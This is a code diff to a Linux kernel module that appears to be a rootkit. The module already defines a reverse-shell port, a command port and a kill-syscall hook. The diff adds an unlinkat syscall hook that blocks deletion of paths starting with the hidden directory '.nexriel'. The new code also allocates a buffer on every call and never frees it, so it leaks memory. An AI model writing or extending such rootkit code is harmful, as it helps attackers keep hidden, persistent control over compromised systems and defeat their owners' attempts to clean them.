@@ -10,15 +10,23 @@
 
 #define REV_SHELL_PORT 1339
 #define COMM_PORT 1337
-
+#define MAGIC_DIR ".nexriel"
+#define PATH_BUF_LEN 256
 #ifdef CONFIG_X86_64
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 17, 0)
 #define PTREGS_SYSCALL_STUB 1
 typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
 static ptregs_t orig_kill;
+
+static ptregs_t orig_unlinkat;
+
 #else
 typedef asmlinkage long (*orig_kill_t)(pid_t pid, int sig);
 static orig_kill_t orig_kill;
+
+typedef asmlinkage long (*orig_unlinkat_t)(int dfd, const char __user *pathname,
+                                           int flags);
+static orig_unlinkat_t orig_unlinkat;
 #endif
 #endif
 
@@ -84,7 +92,62 @@ static notrace asmlinkage long hook_kill(const struct pt_regs *regs) {
   }
   return 0;
 }
+
+static notrace asmlinkage long hook_unlinkat(const struct pt_regs *regs) {
+  long copied;
+  char *buff = kmalloc(PATH_BUF_LEN, GFP_KERNEL);
+  if (buff == NULL) {
+    printk(KERN_INFO "Failed to allocate memory for receive buffer\n");
+    return -ENOMEM;
+  }
+
+  char __user *pathname = (char *)regs->si;
+
+  if (pathname) {
+    copied = strncpy_from_user(buff, pathname, PATH_BUF_LEN);
+    if (copied <= 0) {
+      buff[0] = '\0';
+    } else {
+      buff[PATH_BUF_LEN - 1] = '\0';
+    }
+  } else {
+    buff[0] = '\0';
+  }
+
+  if (strncmp(buff, MAGIC_DIR, strlen(MAGIC_DIR)) == 0) {
+    return -EPERM;
+  }
+
+  return orig_unlinkat(regs);
+}
 #else
+
+static notrace asmlinkage long
+hook_unlinkat(int dfd, const char __user *pathname, int flags) {
+  long copied;
+  char *buff = kmalloc(PATH_BUF_LEN, GFP_KERNEL);
+  if (buff == NULL) {
+    printk(KERN_INFO "Failed to allocate memory for receive buffer\n");
+    return -ENOMEM;
+  }
+
+  if (pathname) {
+    copied = strncpy_from_user(buff, pathname, PATH_BUF_LEN);
+    if (copied <= 0) {
+      buff[0] = '\0';
+    } else {
+      buff[PATH_BUF_LEN - 1] = '\0';
+    }
+  } else {
+    buff[0] = '\0';
+  }
+
+  if (strncmp(buff, MAGIC_DIR, strlen(MAGIC_DIR)) == 0) {
+    return -EPERM;
+  }
+
+  return orig_unlinkat(dfd, pathname, flags);
+}
 
 static notrace asmlinkage long hook_kill(pid_t pid, int sig) {
   switch (sig) {
